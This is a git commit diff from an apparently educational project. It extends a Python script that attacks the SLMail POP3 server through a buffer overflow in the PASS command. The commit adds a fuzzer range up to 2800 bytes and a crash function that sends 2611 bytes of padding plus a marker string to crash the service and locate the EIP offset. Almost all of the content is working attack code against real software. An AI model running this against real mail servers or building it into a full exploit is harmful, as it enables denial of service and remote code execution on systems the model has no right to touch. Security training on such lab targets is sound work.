fd7108d54d49b44e72204f9ad1411883bea06f09
Devin Trejo <dtrejod@gmail.com>
2016-05-01 17:13:01 -0400

    slmail_controleip project final commit

--- projects/20160407_slmail_rootshell_bufferoveflow/slmail_buffer_overflow.py
+++ projects/20160407_slmail_rootshell_bufferoveflow/slmail_buffer_overflow.py
@@ -18,8 +18,8 @@ def main(argv):
     parser = argparse.ArgumentParser(prog="SLMail Buffer Overflow")
     parser.add_argument('--fuzz', '-f', action='store_true', default=False,
         help='run password fuzzer')
-    parser.add_argument('--controlEIP', '-c', action='store_true', default=False,
-        help='control EIP')
+    parser.add_argument('--crash', '-c', action='store_true', default=False,
+        help='crash program')
 
     # Parse args for user input
     args = parser.parse_args()
@@ -27,16 +27,14 @@ def main(argv):
     # Run appropriate functions
     if args.fuzz == True:
         return fuzz_pass(clientIP, clinetPORT)
-    elif args.controlEIP == True:
-        print("Not implemented..")
-        #return fuzz_pass(clientIP, clinetPORT)   
+    elif args.crash == True:
+        return crash(clientIP, clinetPORT)   
 
     return 0
 
-
 def fuzz_pass(clientIP, clinetPORT):
     # Maximum size of PASS buffer sized passed to POP3 server
-    MAX_PASS_BUFFER_LEN = 1000
+    MAX_PASS_BUFFER_LEN = 2800
 
     # Declare a acceptable buffer size that fits into TCP Packet
     BUFFER_SIZE = 1024
@@ -45,7 +43,7 @@ def fuzz_pass(clientIP, clinetPORT):
     USER = "user"
 
     # Loop over PASS input sizes 
-    for i in range(1 ,MAX_PASS_BUFFER_LEN):
+    for i in range(0 ,MAX_PASS_BUFFER_LEN, 1):
         # Try to connect to passed IP
         try:
             # Create a new socket to the server
@@ -81,6 +79,59 @@ def fuzz_pass(clientIP, clinetPORT):
         print("Connection to server closed.\n" +
                 "-"*75 + "\n")
         s.close()
+    return 0
+
+def crash(clientIP, clinetPORT):
+    # Pre-determined size that crashes the buffer
+    crashSize = 2611
+
+    # String to append to end of crashSize
+    myStr = "DEVI"
+
+    # Calculate the new crashSize subtracting length of myStr
+    crashSize = crashSize - len(myStr) - 1
+
+    # Declare a acceptable buffer size that fits into TCP Packet
+    BUFFER_SIZE = 1024
+
+    # Define Static user-name to pass into POP3 protocol USER prompt
+    USER = "user"
+
+    # Try to connect to passed IP
+    try:
+        # Create a new socket to the server
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((clientIP, clinetPORT))
+    except Exception as e:
+        print("Connection could not be made to server.")
+        print("Exception: " + str(e) + "\n\n")
+        s.close()
+        return -1
+
+    # Print for debug to console the length of password buffer
+    print("Connection to POP3 Server Successful! \n" +\
+        "Testing Password Buffer Size of " + str(crashSize) + " bytes.")
+
+    # Send server username
+    s.send(bytes("USER " + USER + "\r\n", 'UTF-8'))
+    
+    # Wait to receive a message
+    data = s.recv(BUFFER_SIZE)
+    data =  bytes.decode(data, 'UTF-8')
+    print("Received data after USER input: \n" + data)
+
+    # Send server password (with long string of A times i)
+    s.send(bytes("PASS " + "A"*crashSize + myStr + "\r\n", 'UTF-8'))
+
+    # Wait to receive a message
+    data = s.recv(BUFFER_SIZE)
+    data =  bytes.decode(data, 'UTF-8')
+    print("Received data after PASS input: \n" + data)
+    
+    # Reset connection for next iteration
+    print("Connection to server closed.\n" +
+            "-"*75 + "\n")
+    s.close()
     return 0
 
 # Run main if this is ran as main function. 
